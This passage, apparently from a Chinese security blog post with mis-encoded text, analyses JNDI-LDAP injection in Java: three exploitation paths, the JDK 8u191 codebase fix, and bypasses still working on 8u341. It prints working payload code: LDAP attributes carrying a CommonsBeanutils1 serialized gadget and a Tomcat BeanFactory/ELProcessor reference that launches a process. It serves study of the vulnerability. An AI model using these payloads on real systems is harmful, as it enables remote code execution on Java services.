src="/img/JNDI-injection-history/12.png"></p><p>å¦‚æœå­˜åœ¨javaClassNameå±æ€§ï¼Œåˆ™è¿›å…¥åˆ°com.sun.jndi.ldap.Obj#decodeObjectç»„è£…Referenceçš„æµç¨‹ã€‚ä»£ç æ¯”è¾ƒæ¸…æ™°ï¼Œä¹Ÿæ˜¯EXPæ„é€ æ¯”è¾ƒé‡è¦çš„ä¸€æ­¥ï¼Œé€ä¸ªåˆ†æä¸‹ï¼šæ ‡ç­¾1 å¦‚æœå­˜åœ¨javaSerializedDataå±æ€§å€¼ï¼Œè¿›å…¥deserializeObjectååºåˆ—åŒ–æ“ä½œã€‚ä»å±æ€§åå­—èƒ½çœ‹å‡ºæ¥æ˜¯javaçš„åºåˆ—åŒ–æ•°æ®ï¼Œä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æœªåšè¿‡æ»¤ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠæ¶æ„å¯¹è±¡ç»‘å®šåœ¨javaSerializedDataå±æ€§ä¸Šï¼Œè¿™æ˜¯JNDI-LDAPçš„ç¬¬ä¸€ä¸ªåˆ©ç”¨ç‚¹</p><p><img src="/img/JNDI-injection-history/13.png"></p><p>com.sun.jndi.ldap.Obj#deserializeObject</p><p><img src="/img/JNDI-injection-history/14.png"></p><h3 id="3-2ã€Ldap-javaReferenceAddressçš„æœ¬åœ°åˆ©ç”¨"><a href="#3-2ã€Ldap-javaReferenceAddressçš„æœ¬åœ°åˆ©ç”¨" class="headerlink" title="3.2ã€Ldap javaReferenceAddressçš„æœ¬åœ°åˆ©ç”¨"></a>3.2ã€Ldap javaReferenceAddressçš„æœ¬åœ°åˆ©ç”¨</h3><p>æ¥ç€å›åˆ°decodeObjectå¾€ä¸‹èµ°ï¼šæ ‡ç­¾2 å¦‚æœå­˜åœ¨javaRemoteLocationå±æ€§å€¼ï¼Œå°±è¿›å…¥decodeRmiObjectæ“ä½œï¼šæ ¹æ®javaClassNameã€javaRemoteLocationã€javaCodeBaseç­‰å±æ€§å€¼ç»„è£…Referenceå¯¹è±¡å¹¶è¿”å›</p><p><img src="/img/JNDI-injection-history/15.png"></p><p>æ¥ç€å›åˆ°decodeObjectå¾€ä¸‹èµ°ï¼šè¿›å…¥æ ‡ç­¾3 å¦‚æœå­˜åœ¨objectClasså±æ€§ä¸”å…¶åŒ…æ‹¬javaNamingReferenceï¼Œåˆ™è¿›å…¥com.sun.jndi.ldap.Obj#decodeReferenceç»„è£…Referenceçš„æ“ä½œ</p><p><img src="/img/JNDI-injection-history/16.png"></p><p>å½“å­˜åœ¨javaClassNameå±æ€§æ—¶ï¼Œæœ€ç»ˆè¿”å›å¯¹è±¡<code>Reference(javaClassName, javaFactory, javacodebase[0])</code>ã€‚å¦‚æœå­˜åœ¨javaReferenceAddresså€¼ï¼Œè¿›å…¥ç»„è£…RefAddrå¯¹è±¡çš„æµç¨‹ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœæ„é€ çš„æ•°æ®æ»¡è¶³æ¡ä»¶ï¼Œä¸javaSerializedDataå±æ€§çš„è§£æè¿‡ç¨‹ä¸€æ ·ï¼Œè¿›å…¥deserializeObjectååºåˆ—åŒ–æµç¨‹ï¼Œè¿™æ˜¯JNDI-LDAPçš„ç¬¬äºŒä¸ªåˆ©ç”¨ç‚¹</p><p><img src="/img/JNDI-injection-history/17.png"></p><h3 id="3-3ã€Ldap-Reference-codebaseçš„è¿œç¨‹åˆ©ç”¨"><a href="#3-3ã€Ldap-Reference-codebaseçš„è¿œç¨‹åˆ©ç”¨" class="headerlink" title="3.3ã€Ldap Reference#codebaseçš„è¿œç¨‹åˆ©ç”¨"></a>3.3ã€Ldap Reference#codebaseçš„è¿œç¨‹åˆ©ç”¨</h3><p>æ‹¿åˆ°äº†Referenceå¯¹è±¡ï¼Œæ¥ç€å›åˆ°com.sun.jndi.ldap.LdapCtx#c_lookupçš„è§£ææµç¨‹ï¼Œæ‰§è¡Œç¬¬4æ­¥çš„getObjectInstanceæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¸JNDI_RMIè§£æè¿‡ç¨‹çš„javax.naming.spi.NamingManager#getObjectInstanceä¸€è‡´ï¼Œéƒ½æ˜¯è·å–codebaseåŠ è½½è¿œç¨‹factoryç±»å¹¶å®ä¾‹åŒ–ã€‚è¿™æ˜¯JNDI-LDAPçš„ç¬¬ä¸‰ä¸ªåˆ©ç”¨ç‚¹</p><p><img src="/img/JNDI-injection-history/18.png"></p><p>ä¿®å¤ï¼šcom.sun.naming.internal.VersionHelper12#loadClass(java.lang.String, java.lang.String)åŠ è½½å¤–éƒ¨factoryæ—¶ï¼Œåœ¨JDK 8u191æ—¶å¢åŠ äº†com.sun.jndi.ldap.object.trustURLCodebase&#x3D;falseçš„é…ç½®ï¼Œé€ æˆloadClass()ç›´æ¥è¿”å›nullï¼Œæ— æ³•é€šè¿‡codebaseå»åŠ è½½æ„é€ çš„å¤–éƒ¨æ¶æ„ç±»ã€‚ä½†æ˜¯ä¸Šé¢æåˆ°çš„ç¬¬ä¸€ç§javaSerializedDataã€ç¬¬äºŒç§RefAddræ–¹å¼ä»ç„¶å¯ä»¥ä½¿ç”¨</p><p><img src="/img/JNDI-injection-history/19.png"></p><p><img src="/img/JNDI-injection-history/20.png"></p><p>åŸºæœ¬çš„è§£ææµç¨‹éƒ½åˆ†æå®Œäº†ï¼Œæœ¬åœ°æµ‹è¯•æ—¶å¯ä»¥èµ·ä¸ªldapæœåŠ¡æ„é€ EXPï¼Œæ­å»ºldapæœåŠ¡å¯ä½¿ç”¨ldapsdkåŒ…ã€‚å¯ä»¥mavenåŠ è½½ä¹Ÿå¯ä»¥å•ç‹¬å¼•å…¥ï¼š<a href="https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1">https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk/3.1.1</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">//pom.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ldapæœåŠ¡ä»£ç å¯å‚è€ƒ<a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java</a></p><h2 id="4ã€ç‰ˆæœ¬ç›¸å…³é—®é¢˜"><a href="#4ã€ç‰ˆæœ¬ç›¸å…³é—®é¢˜" class="headerlink" title="4ã€ç‰ˆæœ¬ç›¸å…³é—®é¢˜"></a>4ã€ç‰ˆæœ¬ç›¸å…³é—®é¢˜</h2><p>JDK8ç³»åˆ—æœ€æ–°ç‰ˆæœ¬(8u341)æµ‹è¯•ï¼Œæœªå¯¹JNDI_LDAPçš„ç¬¬ä¸€ç§javaSerializedDataã€ç¬¬äºŒç§javaReferenceAddressã€Tomcat BeanFactory#getObjectInstanceçš„åˆ©ç”¨æ–¹å¼è¿›è¡Œé™åˆ¶ã€‚å¦‚æœç›®æ ‡ClassPathå­˜åœ¨Gadgetï¼Œè¿˜æ˜¯å¯ä»¥ç»§ç»­åˆ©ç”¨çš„ã€‚æˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ä¸‹ï¼š</p><p>1ã€JNDI_LDAPçš„ç¬¬ä¸€ç§javaSerializedDataåˆ©ç”¨æ–¹å¼ï¼Œåªéœ€è¦æŠŠæ¶æ„ç±»è®¾ç½®ä¸ºjavaSerializedDataçš„å±æ€§å€¼å³å¯</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//æ¶æ„æœåŠ¡ç«¯è®¾ç½®ä¸¤ä¸ªå±æ€§javaClassNameã€javaSerializedData</span><br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Serializer.<span class="hljs-params">serialize</span>(<span class="hljs-params">new</span> CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/21.png"></p><p>2ã€JNDI_LDAPçš„ç¬¬äºŒç§javaReferenceAddressåˆ©ç”¨æ–¹å¼ï¼Œå¯¹äºRefAddrå¯¹è±¡çš„æ•°æ®æ„é€ å¯å‚è€ƒcom.sun.jndi.ldap.Obj#decodeReference</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-number">1</span>ã€å°†javaReferenceAddresså±æ€§å€¼çš„é¦–å­—ç¬¦åšä¸ºåˆ†å‰²ç¬¦ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨!ç¬¦å·<br><span class="hljs-number">2</span>ã€ç¬¬ä¸€è·Ÿç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¸­ä¸ºRefAddr positionï¼Œ<span class="hljs-type">int</span>ç±»å‹æ•°æ®ï¼Œä½¿ç”¨<span class="hljs-number">1</span><br><span class="hljs-number">3</span>ã€ç¬¬äºŒè·Ÿç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦ä¸­ä¸ºRefAddr typeï¼Œ<span class="hljs-type">String</span>ç±»å‹æ•°æ®ï¼Œä½¿ç”¨a<br><span class="hljs-number">4</span>ã€ç¬¬ä¸‰ä¸ªä¸ç¬¬å››ä¸ªåˆ†éš”ç¬¦åœ¨ä¸€èµ·ï¼Œåé¢æ˜¯ç»è¿‡base64ç¼–ç çš„åºåˆ—åŒ–æ•°æ®ï¼Œä½¿ç”¨cbé“¾æ¼”ç¤º<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/22.png"></p><p>æ¶æ„æœåŠ¡ç«¯è®¾ç½®ä¸‰ä¸ªå±æ€§objectClassã€javaClassNameã€javaReferenceAddress</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;foo&quot;</span>)</span>;<br>e.add<span class="hljs-constructor">Attribute(<span class="hljs-string">&quot;javaReferenceAddress&quot;</span>,<span class="hljs-string">&quot;!1!a!!&quot;</span>+<span class="hljs-params">new</span> BASE64Encoder()</span>.encode(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Serializer</span>.</span></span>serialize(<span class="hljs-keyword">new</span> <span class="hljs-constructor">CommonsBeanutils1()</span>.get<span class="hljs-constructor">Object(<span class="hljs-string">&quot;mspaint&quot;</span>)</span>)));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/23.png"></p><p>æˆåŠŸåœ¨JDK8ç³»åˆ—æœ€æ–°ç‰ˆæœ¬å®Œæˆåˆ©ç”¨</p><p>3ã€Tomcat BeanFactory#getObjectInstanceçš„æœ¬åœ°åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ°åœ¨JDK8ç³»åˆ—çš„æœ€æ–°ç‰ˆæœ¬8u341åˆ©ç”¨æˆåŠŸ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ResourceRef resourceRef = <span class="hljs-built_in">new</span> ResourceRef(&quot;javax.el.ELProcessor&quot;,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>,&quot;org.apache.naming.factory.BeanFactory&quot;,<span class="hljs-keyword">null</span>);<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;forceString&quot;,&quot;x=eval&quot;));<br>resourceRef.<span class="hljs-keyword">add</span>(<span class="hljs-built_in">new</span> StringRefAddr(&quot;x&quot;,&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;<span class="hljs-built_in">new</span> java.lang.ProcessBuilder[<span class="hljs-string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="hljs-string">&#x27;calc.exe&#x27;</span>]).<span class="hljs-keyword">start</span>()\&quot;)&quot;));<br></code></pre></td></tr></table></figure><p><img src="/img/JNDI-injection-history/24.png"></p><h2 id="5ã€å‚è€ƒ"><a href="#5ã€å‚è€ƒ" class="headerlink" title="5ã€å‚è€ƒ"></a>5ã€å‚è€ƒ</h2><p><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p><p><a href="https://evilpan.com/2021/12/13/jndi-injection/">https://evilpan.com/2021/12/13/jndi-injection/</a></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSec</tag>
      
      <tag>JNDI</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
